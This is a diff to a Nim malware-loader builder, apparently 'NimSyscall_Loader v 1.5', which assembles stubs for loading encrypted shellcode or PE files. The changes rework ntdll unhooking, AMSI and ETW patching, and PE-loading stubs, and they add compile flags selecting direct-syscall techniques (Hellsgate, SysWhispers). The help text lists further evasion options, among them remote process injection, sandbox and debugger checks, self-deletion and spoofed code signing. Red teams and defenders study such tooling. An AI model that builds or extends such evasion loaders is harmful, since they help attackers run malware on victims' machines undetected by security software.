@@ -25,6 +25,7 @@ import GetSyscallStubs
 import SandboxStubs
 import Whispers
 import SleepyCryptSleep
+import PELoad
 
 
 from system import io
@@ -58,8 +59,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -1053,7 +1053,6 @@ if(unhook):
         stub.add(HellsgateProtectDelegate)
         stub.add(HellsgateWriteDelegate)
         stub.add(HellsgateNtCloseDelegate)
-        stub.add(HellsgateUnhookStub)
     elif(getfreshstub):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
@@ -1061,11 +1060,10 @@ if(unhook):
         stub.add(NtWriteVirtualMemoryDelegate)
         stub.add(NtCloseDelegate)
         stub.add(UnhookSyscalls)
-        stub.add(UnhookStub)
     elif(syswhispers):
         if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
-        stub.add(WhispersUnhookStub)
+    stub.add(UnhookNtdllStub)
 else:
     if(hellsgate):
         stub.add(WinLeanGetCurrentProcStub)
@@ -1089,22 +1087,12 @@ if (AMSI or ETW or peload or (localinject == false) or selfdelete):
 
 if (localinject):
     if (AMSI):
-        if (syswhispers):
-            stub.add(WhispersAMSIPatchStub)
-        if (hellsgate):
-            stub.add(HellsgateAMSIPatchStub)
-        elif(getfreshstub):
-            stub.add(AMSIStub)
+        stub.add(AMSIStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
         else:
-            if (syswhispers):
-                stub.add(WhispersETWPatchStub)
-            if (hellsgate):
-                stub.add(HellsgateETWPatchStub)
-            elif(getfreshstub):
-                stub.add(ETWPatchStub)
+            stub.add(ETWPatchStub)
 
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
@@ -1131,7 +1119,7 @@ if (peload):
             if (embeddedArguments):
                 stub.add(PatchargsFuncs)
             stub.add(HellsgateAllocDelegate)
-            stub.add(HellsPELoadStub)
+            stub.add(PELoadStub)
         elif(getfreshstub):
             if (embeddedArguments):
                 stub.add(PatchargsFuncs)
@@ -1141,7 +1129,7 @@ if (peload):
         elif(syswhispers):
             if (embeddedArguments):
                 stub.add(WhispersPatchargsFuncs)
-            stub.add(WhispersPELoadStub)
+            stub.add(PELoadStub)
     else:   
         stub.add(RemoteProcImportStub)
         if (hellsgate):
@@ -1324,6 +1312,13 @@ elif system.hostOS == "windows":
     basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+
+if(hellsgate):
+    basicCompileFlags.add("-d:Hellsgate ")
+elif(getfreshstub):
+    basicCompileFlags.add("-d:GetSyscallStub ")
+elif(syswhispers):
+    basicCompileFlags.add("-d:SysWhispers ")
 
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
